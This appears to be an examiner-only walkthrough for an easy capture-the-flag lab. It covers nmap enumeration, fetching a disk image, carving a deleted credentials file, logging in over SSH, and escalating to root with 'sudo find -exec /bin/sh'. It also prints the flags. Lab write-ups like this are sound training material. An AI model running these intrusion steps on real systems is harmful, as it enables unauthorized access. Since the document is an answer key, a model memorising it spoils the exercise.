# m1-recovery — walkthrough (EXAMINER ONLY)

Level: easy. Skills: service enumeration, **forensic file recovery**, sudo privesc.

## 1. Enumerate
```bash
nmap -sC -sV -p- <IP>
# 21/tcp  ftp     vsftpd   (anonymous)
# 22/tcp  ssh
# 80/tcp  http    Apache
```
HTTP root advertises a `disk_backup.img`. Anonymous FTP serves the same file
under `pub/`.

## 2. Grab the image
```bash
wget http://<IP>/disk_backup.img
# or:
ftp <IP>   # user: anonymous  (no password)  -> get pub/disk_backup.img
```

## 3. Forensic recovery (the "forensic" first step)
The image once held `credentials.txt`, which was **deleted**. Deleting a file on
ext4 does not wipe the data blocks, so any of these recover it:

```bash
strings disk_backup.img | grep -iE 'FLAG|pass|jdoe'      # easiest
# or carve it:
foremost -i disk_backup.img -o out/        # recovers deleted files
photorec disk_backup.img                   # interactive carver
# or:
mkdir m && sudo mount -o loop disk_backup.img m   # then extundelete / debugfs
extundelete disk_backup.img --restore-all
```
Recovered content:
```
SSH : jdoe
Pass: sunshine2019
user flag: FLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}      <-- USER FLAG
```

## 4. Access
```bash
ssh jdoe@<IP>      # sunshine2019
```

## 5. Privesc (GTFOBins: find)
```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
# id -> uid=0(root)
cat /root/root.txt
# FLAG{sud0_f1nd_g1v3s_r00t}                      <-- ROOT FLAG
```
